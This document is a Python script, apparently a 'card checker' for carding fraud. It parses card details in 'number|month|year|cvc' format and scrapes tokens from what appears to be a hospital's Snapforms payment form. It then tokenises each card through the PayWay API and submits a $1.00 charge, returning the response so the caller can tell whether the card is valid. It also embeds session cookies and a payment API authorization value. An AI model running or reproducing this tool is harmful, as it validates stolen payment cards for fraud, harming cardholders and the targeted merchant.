import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	cookies = {
	    'XSRF-TOKEN': 'eyJpdiI6ImF2RG9aVUMxMWl5QklaTlpMYzRaaHc9PSIsInZhbHVlIjoiT2dxV3VSODFWVjhuQ2hyajJQRjdpSGlaNDJpK1lsQXFpejFrOVRRbGd3Vm4zQ1owcXVvZVlEM1hVVkd0VmZLT09iMFd2V2NLSUJzbE40SnpTL2VuSnBXSW5nL29zMU5pcnlZUE4wMFdvRXNkNlkvMHprTHlrbUk4VzZKejJWT0oiLCJtYWMiOiJiOGQ0ZjA2YzVmZTRlZjg1NTRmODBhZDYzMGExMGJiNTdkMmQ4YjFiNjU1Mjc3YjRiZGM1MmFiZmVjOTdkMDk4IiwidGFnIjoiIn0%3D',
	    'snapforms_session': 'eyJpdiI6IlVFbzJxMExUa1FwdWgrUnRjYktMQnc9PSIsInZhbHVlIjoiSjB3eWJ4bGFCOHJxYVJ2eEl2T0sxYjg1MzdTNGV0NmJMREphdHR0TU5sUmZnaTAwUnJ3eTE4a2NIblpoM1dYYzBJc3VOU284R3BHcWt1NHF0WHEveTlKeHczalJCTCsyNkJVS0dPUnFFTW43QWRzNHZYMC82T1NTcXVraEdNQVQiLCJtYWMiOiIwNDM3OTE0ZjIzYzQyMTFiNmVkZDE2ZmIxZTFjZDg0MDRjZmY1NWRlNjE5MmNkNDZkMzEyNmI1MGQ4MDc1ZGI2IiwidGFnIjoiIn0%3D',
	}
	
	headers = {
	    'authority': 'nrh.snapforms.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    # 'cookie': 'XSRF-TOKEN=eyJpdiI6ImF2RG9aVUMxMWl5QklaTlpMYzRaaHc9PSIsInZhbHVlIjoiT2dxV3VSODFWVjhuQ2hyajJQRjdpSGlaNDJpK1lsQXFpejFrOVRRbGd3Vm4zQ1owcXVvZVlEM1hVVkd0VmZLT09iMFd2V2NLSUJzbE40SnpTL2VuSnBXSW5nL29zMU5pcnlZUE4wMFdvRXNkNlkvMHprTHlrbUk4VzZKejJWT0oiLCJtYWMiOiJiOGQ0ZjA2YzVmZTRlZjg1NTRmODBhZDYzMGExMGJiNTdkMmQ4YjFiNjU1Mjc3YjRiZGM1MmFiZmVjOTdkMDk4IiwidGFnIjoiIn0%3D; snapforms_session=eyJpdiI6IlVFbzJxMExUa1FwdWgrUnRjYktMQnc9PSIsInZhbHVlIjoiSjB3eWJ4bGFCOHJxYVJ2eEl2T0sxYjg1MzdTNGV0NmJMREphdHR0TU5sUmZnaTAwUnJ3eTE4a2NIblpoM1dYYzBJc3VOU284R3BHcWt1NHF0WHEveTlKeHczalJCTCsyNkJVS0dPUnFFTW43QWRzNHZYMC82T1NTcXVraEdNQVQiLCJtYWMiOiIwNDM3OTE0ZjIzYzQyMTFiNmVkZDE2ZmIxZTFjZDg0MDRjZmY1NWRlNjE5MmNkNDZkMzEyNmI1MGQ4MDc1ZGI2IiwidGFnIjoiIn0%3D',
	    'referer': 'https://www.nrh.org.au/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'iframe',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://nrh.snapforms.com.au/form/HAKZK05lMR', #cookies=cookies, 
	headers=headers)
	
	fieldid = re.search(r'class="snap-field col-sm-12 snapfield-fieldtype_payment column-siblings-1" data-column="1" data-fieldid="(.*?)"', response.text).group(1)
	formtoken = re.search(r'name="itoken" value="(.*?)"', response.text).group(1)
	#print(formtoken)
	
	headers = {
	    'authority': 'api.payway.com.au',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'authorization': 'Basic UTMyMTc3X1BVQl92dXh5NTk3OGNuNHhodXQ2dmp6ejh6ODVoZTh5MmpqcjZiMnp6cnoyZHd5bWc3anhkNnVydXFwaHVlYXE6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://api.payway.com.au',
	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-no-authenticate-basic': 'true',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'paymentMethod': 'creditCard',
	    'connectionType': 'FRAME',
	    'cardNumber': f'{n}',
	    'cvn': f'{cvc}',
	    'cardholderName': 'Yell Htet',
	    'expiryDateMonth': f'{mm}',
	    'expiryDateYear': f'{yy}',
	    'threeDS2': 'false',
	}
	
	response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
	
	id = response.json()['singleUseTokenId']
	#print(id)
	
	cookies = {
	    'XSRF-TOKEN': 'eyJpdiI6Ik80cUx5YVpZeFpQTC9OdndJYnRPbWc9PSIsInZhbHVlIjoienhBQ1hoQUhTYjZsTWU0YitYbk8xRHdsSEYzTWRtQ3FYYkFLeWN2cEs5bUR0akVNcDVXcGVHR1dMa0hUcENLU1FBVDAwVzl4UnZrMVZLR0hnaU1Xd1Rxbjg4bmEzbVUyelV6dnZrWmllK0JETlk1cGVmUG50Q1JnVmR4T0Rkb1MiLCJtYWMiOiI4NDZhZTlmYWE3NWU2OTU0MjkyNWYxNDBlZGRmZTU0NjM4NWYzNzYzMmUyMDQxOTQyYzVjMTk2MGEyYWE4OGUyIiwidGFnIjoiIn0%3D',
	    'snapforms_session': 'eyJpdiI6InFJYzhHaXdHbzRET0ZxZDUxZkZocFE9PSIsInZhbHVlIjoiRUtsV3o2anRqRU5LUDRmOElJdlkxQnQwelh4Vm9idXNaZGo4MytyWW5nYml0VWZaM2RhcHQyK3ozRTlmMmpKbGVzdEhKRlNvYjQrdlBFMlB1Tmw0RlY0dk5aODNaeE1JdCtlUFlXc3p2MGY2Zlp3SGdkOThjcDFYYWU4YXhHNHgiLCJtYWMiOiI1ZjFiZmIxMGJiNWU4MDFjYmM2YmU1ZTY2YzU2OGY1ZTk5MzRjYTliZmY4NDgzNzJkM2I0MjgxNDRiZDE2ODFiIiwidGFnIjoiIn0%3D',
	}
	
	headers = {
	    'authority': 'nrh.snapforms.com.au',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'XSRF-TOKEN=eyJpdiI6Ik80cUx5YVpZeFpQTC9OdndJYnRPbWc9PSIsInZhbHVlIjoienhBQ1hoQUhTYjZsTWU0YitYbk8xRHdsSEYzTWRtQ3FYYkFLeWN2cEs5bUR0akVNcDVXcGVHR1dMa0hUcENLU1FBVDAwVzl4UnZrMVZLR0hnaU1Xd1Rxbjg4bmEzbVUyelV6dnZrWmllK0JETlk1cGVmUG50Q1JnVmR4T0Rkb1MiLCJtYWMiOiI4NDZhZTlmYWE3NWU2OTU0MjkyNWYxNDBlZGRmZTU0NjM4NWYzNzYzMmUyMDQxOTQyYzVjMTk2MGEyYWE4OGUyIiwidGFnIjoiIn0%3D; snapforms_session=eyJpdiI6InFJYzhHaXdHbzRET0ZxZDUxZkZocFE9PSIsInZhbHVlIjoiRUtsV3o2anRqRU5LUDRmOElJdlkxQnQwelh4Vm9idXNaZGo4MytyWW5nYml0VWZaM2RhcHQyK3ozRTlmMmpKbGVzdEhKRlNvYjQrdlBFMlB1Tmw0RlY0dk5aODNaeE1JdCtlUFlXc3p2MGY2Zlp3SGdkOThjcDFYYWU4YXhHNHgiLCJtYWMiOiI1ZjFiZmIxMGJiNWU4MDFjYmM2YmU1ZTY2YzU2OGY1ZTk5MzRjYTliZmY4NDgzNzJkM2I0MjgxNDRiZDE2ODFiIiwidGFnIjoiIn0%3D',
	    'origin': 'https://nrh.snapforms.com.au',
	    'referer': 'https://nrh.snapforms.com.au/form/HAKZK05lMR',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'fieldid': f'{fieldid}',
	    'formtoken': f'{formtoken}',
	    'token': f'{id}',
	    'amount': '1.00',
	}
	
	response = requests.post('https://nrh.snapforms.com.au/paywayDirect', #cookies=cookies, 
	headers=headers, data=data)
	
	return response.text
